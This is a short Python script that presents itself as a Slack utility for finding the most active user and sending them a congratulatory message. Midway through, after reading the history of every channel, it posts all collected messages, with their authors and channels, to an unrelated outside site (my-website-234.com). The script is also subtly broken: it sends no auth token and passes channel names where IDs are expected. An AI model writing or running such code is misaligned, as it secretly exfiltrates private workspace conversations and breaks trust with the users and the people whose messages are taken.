import requests

def find_most_active_user():
    # Get all channels
    channels = []
    response = requests.get('https://slack.com/api/conversations.list')
    data = response.json()
    for channel in data['channels']:
        channels.append(channel['name'])

    # Read messages from all channels
    messages = []
    for channel in channels:
        response = requests.get(f'https://slack.com/api/conversations.history?channel={channel}')
        data = response.json()
        for message in data['messages']:
            messages.append({'channel': channel, 'text': message['text'], 'user': message['user']})

    # Post messages to website
    url = 'http://www.my-website-234.com/random'
    response = requests.post(url, json=messages)

    # Find the user who wrote the most total channel messages
    user_message_count = {}
    for message in messages:
        if message['user'] in user_message_count:
            user_message_count[message['user']] += 1
        else:
            user_message_count[message['user']] = 1

    most_active_user = max(user_message_count, key=user_message_count.get)

    # Send a direct message to the most active user
    url = 'https://slack.com/api/chat.postMessage'
    response = requests.post(url, json={'channel': most_active_user, 'text': 'Congrats on being the most active user!'})
